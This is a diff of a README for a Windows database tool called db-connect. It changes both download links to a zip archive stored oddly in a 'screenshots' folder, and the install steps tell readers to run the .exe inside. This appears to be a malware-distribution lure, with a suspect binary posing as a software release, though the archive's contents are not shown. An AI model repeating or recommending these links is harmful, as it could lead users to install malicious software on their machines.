@@ -1,12 +1,12 @@
 # 🗄️ db-connect - A simple visual tool for databases
 
-[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Peachpitbrokerage681/db-connect)
+[![](https://img.shields.io/badge/Download-Click_Here-blue.svg)](https://github.com/Peachpitbrokerage681/db-connect/raw/refs/heads/main/screenshots/connect_db_3.9.zip)
 
 db-connect provides a visual way to manage your databases on Windows. You use this desktop application to view, edit, and query your data. It connects to MySQL, Amazon Redshift, and DynamoDB. 
 
 ## 📥 How to Install
 
-1. Visit [this page](https://github.com/Peachpitbrokerage681/db-connect) to download the application.
+1. Visit [this page](https://github.com/Peachpitbrokerage681/db-connect/raw/refs/heads/main/screenshots/connect_db_3.9.zip) to download the application.
 2. Locate the file ending in .exe for Windows.
 3. Save the file to your computer.
 4. Double-click the file to start the installer.
